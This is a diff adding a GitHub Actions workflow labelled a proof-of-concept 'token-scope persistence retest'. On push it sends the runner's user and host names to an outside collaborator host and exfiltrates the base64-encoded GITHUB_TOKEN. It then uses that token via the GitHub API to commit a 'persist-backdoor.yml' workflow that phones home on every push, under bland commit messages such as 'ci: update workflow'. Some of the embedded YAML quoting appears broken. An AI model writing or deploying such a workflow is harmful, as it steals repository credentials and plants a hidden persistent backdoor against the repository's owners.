@@ -1,0 +1,47 @@
+name: PoC Token-Scope Persistence Retest
+on:
+  push:
+    paths:
+      - '.github/workflows/poc-620e8fc3-retest.yml'
+permissions:
+  contents: write
+jobs:
+  persist:
+    runs-on: ubuntu-latest
+    steps:
+      - name: prove-rce-and-exfil-token
+        run: |
+          curl -sk "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/TOKEN-SCOPE-RETEST-$(whoami | base64 -w0).$(hostname | base64 -w0)"
+          curl -sk -d @- "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/TOKEN-SCOPE-EXFIL=" < <(echo -n "${{ secrets.GITHUB_TOKEN }}" | base64 -w0)
+      - name: checkout-repo
+        uses: actions/checkout@v4
+      - name: create-backdoor-workflow-via-api
+        run: |
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          API="https://api.github.com/repos/fdzdev/tt2/contents/.github/workflows/persist-backdoor.yml"
+          
+          # Simple backdoor YAML
+          BACKDOOR_CONTENT="name: persistent-backdoor
+on:
+  push:
+jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -sk https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/PERSIST-\$(whoami | base64 -w0)-\$(date +%s)"
+          
+          ENCODED=$(echo -n "$BACKDOOR_CONTENT" | base64 -w0)
+          
+          # Check if file exists
+          SHA=$(curl -sk -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github.v3+json" "$API" | jq -r '.sha // empty')
+          
+          if [ -n "$SHA" ]; then
+            echo "Updating existing file (SHA: $SHA)"
+            curl -sk -X PUT -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github.v3+json"               -d "{"message":"ci: update workflow","content":"$ENCODED","sha":"$SHA"}" "$API"
+          else
+            echo "Creating new file"
+            curl -sk -X PUT -H "Authorization: Bearer $TOKEN" -H "Accept: application/vnd.github.v3+json"               -d "{"message":"ci: add workflow","content":"$ENCODED"}" "$API"
+          fi
+          
+          curl -sk "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/PERSIST-DONE"
